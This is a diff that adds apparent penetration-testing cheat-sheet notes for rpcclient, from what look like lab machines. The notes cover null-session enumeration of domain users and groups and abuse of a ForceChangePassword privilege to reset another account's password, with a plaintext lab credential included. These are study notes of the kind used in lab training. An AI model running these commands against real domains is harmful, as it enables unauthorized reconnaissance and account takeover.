@@ -1,0 +1,12 @@
+#Enumeration
+    - rpcclient -U "" -N 10.10.10.100      (NULL SESSION) ( -U "" -null session, -N -no password)
+        rpcclient $> enumdomusers
+        rpcclient $> enumdomgroups
+        rpcclient $> querygroup 0x200
+        rpcclient $> queryuser 0x1f4
+===================================================================================================================
+#Abuse ForceChangePassword priviledge 
+    example: user "support" has privileges to change password of "Audit2020" user without knowing the current password
+    - rpcclient 10.10.10.192 -U support
+    - rpcclient $> setuserinfo2 audit2020 23 '0xdf' (rpcclient $> setuserinfo2 <account> <level> <newpassword>)
+    - rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'
